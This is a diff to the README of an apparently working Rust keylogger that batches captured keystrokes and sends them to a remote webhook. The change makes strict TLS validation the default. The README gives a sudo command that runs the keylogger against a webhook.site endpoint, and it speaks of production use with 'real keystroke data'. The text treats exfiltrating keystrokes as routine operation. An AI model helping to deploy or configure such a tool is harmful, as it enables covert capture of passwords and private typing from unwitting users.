@@ -139,15 +139,16 @@ Batching configuration:
 - **Batch size**: 20 keystrokes per request
 - **Timeout**: 2 seconds (sends partial batch if no new keys)
 - **Connection timeout**: 10 seconds
-- **Certificate validation**: By default, accepts invalid/self-signed certificates for testing compatibility
+- **Certificate validation**: Enabled by default (secure mode)
 
-⚠️ **Security Warning**: By default, TLS certificate validation is disabled (`danger_accept_invalid_certs=true`) to ensure compatibility with webhook testing services like webhook.site that may use self-signed certificates. This makes connections vulnerable to man-in-the-middle attacks.
+⚠️ **TLS Certificate Validation**: By default, the keylogger uses strict TLS certificate validation to protect against man-in-the-middle attacks. If you're using webhook testing services with self-signed certificates, you can disable validation:
 
-For production use with proper TLS certificates, enable strict validation:
 ```bash
-export RUST_KEY_ACCEPT_INVALID_CERTS=false
-sudo ./target/release/rust-key https://your-secure-webhook.com/endpoint
+export RUST_KEY_ACCEPT_INVALID_CERTS=true
+sudo ./target/release/rust-key https://webhook.site/your-test-id
 ```
+
+**Security Warning**: Only disable certificate validation for testing purposes. For production use with real keystroke data, always use properly signed TLS certificates and keep validation enabled (default).
 
 ### Webhook Troubleshooting
 
